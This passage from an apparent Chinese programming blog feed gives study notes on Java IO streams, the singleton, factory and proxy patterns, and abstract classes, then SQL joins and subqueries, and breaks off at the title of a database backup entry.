<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ByteArrayInputStream</span><span class="params">(<span class="keyword">byte</span>[] b)</span></span>;<span class="comment">//数据保存到内存</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ByteArrayOutputStream</span><span class="params">()</span></span>;<span class="comment">//读取内存数据</span></span><br></pre></td></tr></table></figure>

<h1 id="管道流"><a href="#管道流" class="headerlink" title="管道流"></a>管道流</h1><p><code>管道流是用来在多个线程之间进行信息传递的Java流</code></p>
<ul>
<li>字节管道流</li>
</ul>
<p>PipedOutputStream、PipedInPutStream</p>
<ul>
<li>字符管道流</li>
</ul>
<p>PipedWriter、PipedReader</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">connect</span><span class="params">(PipedIntputStrem snk)</span></span>;<span class="comment">//连接处理</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">connect</span><span class="params">(PipedReader snk)</span></span>;<span class="comment">//连接处理</span></span><br></pre></td></tr></table></figure>

<h1 id="RandomAccessFile类"><a href="#RandomAccessFile类" class="headerlink" title="RandomAccessFile类"></a>RandomAccessFile类</h1><p><code>RandomAccessFile类是一个专门读写文件的类，封装了基本的IO流，在读写文件内容方面比常规IO流更方便、更灵活。但也仅限于读写文件，无法像IO流一样，可以传输内存和网络中的数据。</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">RandomAccessFile</span><span class="params">(File file,String mode)</span></span>;<span class="comment">//mode:r、rw</span></span><br></pre></td></tr></table></figure>

<h1 id="打印流"><a href="#打印流" class="headerlink" title="打印流"></a>打印流</h1><p><code>提高已有类的功能</code></p>
<ul>
<li>PrintStream</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">PrintStream</span><span class="params">(OutputStream out)</span></span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>PrintWriter</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">PrintWriter</span><span class="params">(OutputStream out)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">PrintWriter</span><span class="params">(Writer out)</span></span>;</span><br></pre></td></tr></table></figure>

<h1 id="标准流"><a href="#标准流" class="headerlink" title="标准流"></a>标准流</h1><h1 id="System"><a href="#System" class="headerlink" title="System"></a>System</h1><p><code>管理标准输入/输出流和错误流</code></p>
<ul>
<li>标准输出</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> PrintStream out;</span><br></pre></td></tr></table></figure>

<ul>
<li>错误输出</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> PrintStream err;</span><br></pre></td></tr></table></figure>

<ul>
<li>标准输出</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> PrintStream in;</span><br></pre></td></tr></table></figure>

<h1 id="缓冲流"><a href="#缓冲流" class="headerlink" title="缓冲流"></a>缓冲流</h1><ul>
<li>BufferedInputStream</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">BufferedInputStream</span><span class="params">(InputStream in)</span> </span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">BufferedInputStream</span><span class="params">(InputStream in, <span class="keyword">int</span> size)</span> </span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>BufferedOutputStream</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">BufferedOutputStream</span><span class="params">(OutputStream out)</span> </span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">BufferedOutputStream</span><span class="params">(OutputStream out, <span class="keyword">int</span> size)</span> </span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>BufferedReader</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">BufferedReader</span><span class="params">(Reader in)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">BufferedReader</span><span class="params">(Reader in, <span class="keyword">int</span> size)</span></span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>BufferedWriter</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">BufferedWriter</span><span class="params">(Writer out)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">BufferedWriter</span><span class="params">(Writer out, <span class="keyword">int</span> size)</span></span></span><br></pre></td></tr></table></figure>

<h1 id="Scanner"><a href="#Scanner" class="headerlink" title="Scanner"></a>Scanner</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Scanner</span><span class="params">(InputStream source)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasNext</span><span class="params">()</span></span>;<span class="comment">//判断是否还有数据</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">next</span><span class="params">()</span></span>;<span class="comment">//取出数据</span></span><br></pre></td></tr></table></figure>

]]></content>
      
        <categories>
            
            <category> Java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Java </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Java单例设计]]></title>
      <url>/2019/10/05/Java%E5%8D%95%E4%BE%8B%E8%AE%BE%E8%AE%A1/</url>
      <content type="html"><![CDATA[<h1 id="单例设计"><a href="#单例设计" class="headerlink" title="单例设计"></a>单例设计</h1><p><code>通过单例模式的方法创建的类在当前进程中只有一个实例，并且自行实例化向整个系统提供</code></p>
<ul>
<li>饿汉式</li>
</ul>
<blockquote>
<p>自动加载</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Singleton INSTANCE = <span class="keyword">new</span> Singleton() ;</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;&#125;	<span class="comment">// 构造方法私有化了</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;<span class="comment">//向外提供静态访问方法</span></span><br><span class="line">		<span class="keyword">return</span> INSTANCE ;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaDemo</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">		Singleton instance = <span class="keyword">null</span> ;	<span class="comment">// 声明对象</span></span><br><span class="line">		instance = Singleton.getInstance();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>懒汉式</li>
</ul>
<blockquote>
<p>第一次使用才加载</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> Singleton instance ;</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;&#125;	<span class="comment">// 构造方法私有化了</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;<span class="comment">//向外提供静态访问方法</span></span><br><span class="line">		<span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;	<span class="comment">// 第一次使用</span></span><br><span class="line">			instance = <span class="keyword">new</span> Singleton() ; <span class="comment">// 实例化对象</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> instance ;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaDemo</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">		Singleton instance = <span class="keyword">null</span> ;	<span class="comment">// 声明对象</span></span><br><span class="line">		instance = Singleton.getInstance();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      
        <categories>
            
            <category> Java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Java </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Java工厂模式]]></title>
      <url>/2019/10/05/Java%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/</url>
      <content type="html"><![CDATA[<h1 id="工厂模式"><a href="#工厂模式" class="headerlink" title="工厂模式"></a>工厂模式</h1><blockquote>
<p>非工厂模式:一个接口和一个子类绑定在了一起产生了耦合，A-B绑定在一起如果要修改的同时修改</p>
<p>工厂模式：A-B-C在A-B直接加多一个过渡类C，修改A是BC不影响，可移植性提高了，增加子类只要修改过渡类，避免了耦合问题</p>
</blockquote>
<ul>
<li>非工厂模式</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">IFood</span> </span>&#123;	<span class="comment">// 定义一个食物标准</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span> </span>; <span class="comment">// 吃</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bread</span> <span class="keyword">implements</span> <span class="title">IFood</span> </span>&#123; <span class="comment">// 定义一种食物</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"吃面包。"</span>) ;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Milk</span> <span class="keyword">implements</span> <span class="title">IFood</span> </span>&#123; <span class="comment">// 定义一种食物</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"喝牛奶。"</span>) ;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaDemo</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">		IFood food = <span class="keyword">new</span> Milk() ;</span><br><span class="line">		food.eat() ;<span class="comment">// 吃面包</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>工厂模式</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">IFood</span> </span>&#123;	<span class="comment">// 定义一个食物标准</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span> </span>; <span class="comment">// 吃</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bread</span> <span class="keyword">implements</span> <span class="title">IFood</span> </span>&#123; <span class="comment">// 定义一种食物</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"吃面包。"</span>) ;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Milk</span> <span class="keyword">implements</span> <span class="title">IFood</span> </span>&#123; <span class="comment">// 定义一种食物</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"喝牛奶。"</span>) ;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Factory</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> IFood <span class="title">getInstance</span><span class="params">(String className)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="string">"bread"</span>.equals(className)) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">new</span> Bread() ;</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">"milk"</span>.equals(className)) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">new</span> Milk() ;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">null</span> ;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaDemo</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">		IFood food = Factory.getInstance(args[<span class="number">0</span>]) ;</span><br><span class="line">		food.eat() ;<span class="comment">// 吃面包</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      
        <categories>
            
            <category> Java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Java </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Java代理模式]]></title>
      <url>/2019/10/05/Java%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/</url>
      <content type="html"><![CDATA[<h1 id="代理模式"><a href="#代理模式" class="headerlink" title="代理模式"></a>代理模式</h1><p><code>代理设计模式，就是指一个代理主题来操作真实主题。真实主题执行具体的业务操作，而代理主题负责其他相关业务的处理</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">IEat</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">get</span><span class="params">()</span> </span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EatReal</span> <span class="keyword">implements</span> <span class="title">IEat</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">get</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"【真实主题】得到一份食物，而后开始品尝美味。"</span>) ;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EatProxy</span> <span class="keyword">implements</span> <span class="title">IEat</span> </span>&#123;	<span class="comment">// 服务代理</span></span><br><span class="line">	<span class="keyword">private</span> IEat eat ; <span class="comment">// 为吃而服务</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">EatProxy</span><span class="params">(IEat eat)</span> </span>&#123;	<span class="comment">// 一定要有一个代理项</span></span><br><span class="line">		<span class="keyword">this</span>.eat = eat ;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">get</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">this</span>.prepare() ;</span><br><span class="line">		<span class="keyword">this</span>.eat.get() ;	<span class="comment">//调用真实主题</span></span><br><span class="line">		<span class="keyword">this</span>.clear() ;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">prepare</span><span class="params">()</span> </span>&#123;	<span class="comment">// 准备过程</span></span><br><span class="line">		System.out.println(<span class="string">"【代理主题】1、精心购买食材。"</span>) ;</span><br><span class="line">		System.out.println(<span class="string">"【代理主题】2、小心的处理食材。"</span>) ;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">clear</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"【代理主题】3、收拾碗筷。"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaDemo</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">		IEat eat = <span class="keyword">new</span> EatProxy(<span class="keyword">new</span> EatReal()) ;</span><br><span class="line">		eat.get() ;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      
        <categories>
            
            <category> Java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Java </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Java抽象类]]></title>
      <url>/2019/10/05/Java%E6%8A%BD%E8%B1%A1%E7%B1%BB/</url>
      <content type="html"><![CDATA[<h1 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h1><p><code>在面向对象的概念中，所有的对象都是通过类来描绘的，但是反过来，并不是所有的类都是用来描绘对象的，如果一个类中没有包含足够的信息来描绘一个具体的对象，这样的类就是抽象类。</code></p>
<ul>
<li>抽象类不能被实例化</li>
<li>抽象类中不一定包含抽象方法，但是有抽象方法的类必定是抽象类。</li>
<li>抽象类中的抽象方法只是声明，不包含方法体，就是不给出方法的具体实现也就是方法的具体功能。</li>
<li>构造方法，类方法（用 static 修饰的方法）不能声明为抽象方法。</li>
<li>抽象类的子类必须给出抽象类中的抽象方法的具体实现，除非该子类也是抽象类。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Message</span> </span>&#123;	<span class="comment">// 定义抽象类</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> String <span class="title">getConnectInfo</span><span class="params">()</span> </span>;	<span class="comment">// 抽象方法</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setType</span><span class="params">(String type)</span> </span>&#123;	<span class="comment">// 普通方法</span></span><br><span class="line">		<span class="keyword">this</span>.type = type ;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      
        <categories>
            
            <category> Java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Java </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[多表查询]]></title>
      <url>/2019/10/03/%E5%A4%9A%E8%A1%A8%E6%9F%A5%E8%AF%A2/</url>
      <content type="html"><![CDATA[<h1 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h1><h2 id="合并结果集"><a href="#合并结果集" class="headerlink" title="合并结果集"></a>合并结果集</h2><p><code>要求两个结果集的列数和列类型完全相同</code></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> 表<span class="number">1</span> <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> 表<span class="number">2</span>;</span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> 表<span class="number">1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> 表<span class="number">2</span>;//去除重复的</span><br></pre></td></tr></table></figure>

<h2 id="连接查询"><a href="#连接查询" class="headerlink" title="连接查询"></a>连接查询</h2><h3 id="内连接"><a href="#内连接" class="headerlink" title="内连接"></a>内连接</h3><p><code>查询所有满足条件的</code></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> 表<span class="number">1</span> 别名<span class="number">1</span>，表<span class="number">2</span> 别名<span class="number">2</span> <span class="keyword">WHERE</span> 别名<span class="number">1.</span>列名=别名<span class="number">2.</span>列名;</span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> 表<span class="number">1</span> 别名<span class="number">1</span> <span class="keyword">INNER</span> <span class="keyword">JOIN</span> 表<span class="number">2</span> 别名<span class="number">2</span> <span class="keyword">ON</span> 别名<span class="number">1.</span>列名=别名<span class="number">2.</span>列名;</span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> 表<span class="number">1</span> 别名<span class="number">1</span> <span class="keyword">NATURAL</span> <span class="keyword">JOIN</span> 表<span class="number">2</span> 别名<span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<h3 id="外连接"><a href="#外连接" class="headerlink" title="外连接"></a>外连接</h3><ul>
<li>左外</li>
</ul>
<p><code>左表查询全部，右表查询满足的</code></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> 表<span class="number">1</span> 别名<span class="number">1</span> <span class="keyword">LEFT</span> <span class="keyword">OUTER</span> <span class="keyword">JOIN</span> 表<span class="number">2</span> 别名<span class="number">2</span> <span class="keyword">ON</span> 别名<span class="number">1.</span>列名=别名<span class="number">2.</span>列名;</span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> 表<span class="number">1</span> 别名<span class="number">1</span> <span class="keyword">NATURAL</span> <span class="keyword">LEFT</span> <span class="keyword">OUTER</span> <span class="keyword">JOIN</span> 表<span class="number">2</span> 别名<span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>右外</li>
</ul>
<p><code>右表查询全部，左表查询满足的</code></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> 表<span class="number">1</span> 别名<span class="number">1</span> <span class="keyword">RIGHT</span> <span class="keyword">OUTER</span> <span class="keyword">JOIN</span> 表<span class="number">2</span> 别名<span class="number">2</span> <span class="keyword">ON</span> 别名<span class="number">1.</span>列名=别名<span class="number">2.</span>列名;</span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> 表<span class="number">1</span> 别名<span class="number">1</span> <span class="keyword">NATURAL</span> <span class="keyword">RIGHT</span> <span class="keyword">OUTER</span> <span class="keyword">JOIN</span> 表<span class="number">2</span> 别名<span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>全连接</li>
</ul>
<p><code>左外和右外使用UNION连接</code></p>
<h3 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h3><ul>
<li>出现的位置</li>
</ul>
<p><code>WHERE后作为条件</code><br><code>FROM后作为表存在</code></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> 表<span class="number">1</span> 别名<span class="number">1</span> <span class="keyword">WHERE</span> 列<span class="number">1</span> [=、&gt;、&lt;、&gt;=、&lt;=、！=](<span class="keyword">SELECT</span> 列名 <span class="keyword">FROM</span> 表<span class="number">2</span> 别名<span class="number">2</span> <span class="keyword">WHERE</span> 条件);//单行单列</span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> 表<span class="number">1</span> 别名<span class="number">1</span> <span class="keyword">WHERE</span> 列<span class="number">1</span> [=、&gt;、&lt;、&gt;=、&lt;=、！=] [<span class="keyword">IN</span>,<span class="keyword">ALL</span>,<span class="keyword">ANY</span>](<span class="keyword">SELECT</span> 列名 <span class="keyword">FROM</span> 表<span class="number">2</span> 别名<span class="number">2</span> <span class="keyword">WHERE</span> 条件);//多行单列</span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> 表<span class="number">1</span> 别名<span class="number">1</span> <span class="keyword">WHERE</span>(列<span class="number">1</span>，列<span class="number">2</span>) <span class="keyword">IN</span> (<span class="keyword">SELECT</span> 列<span class="number">1</span>，列<span class="number">2</span> <span class="keyword">FROM</span> 表<span class="number">2</span> 别名<span class="number">2</span> <span class="keyword">WHERE</span> 条件);//单行多列</span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> 表<span class="number">1</span> 别名<span class="number">1</span> , (<span class="keyword">SELECT</span> ...) 别名<span class="number">2</span> <span class="keyword">WHERE</span> 条件;//多汗多列</span><br></pre></td></tr></table></figure>

]]></content>
      
        <categories>
            
            <category> 数据库 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[数据库备份和还原]]></title>
      <url>/2019/10/03/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD%E5%92%8C%E8%BF%98%E5%8E%9F/</url>
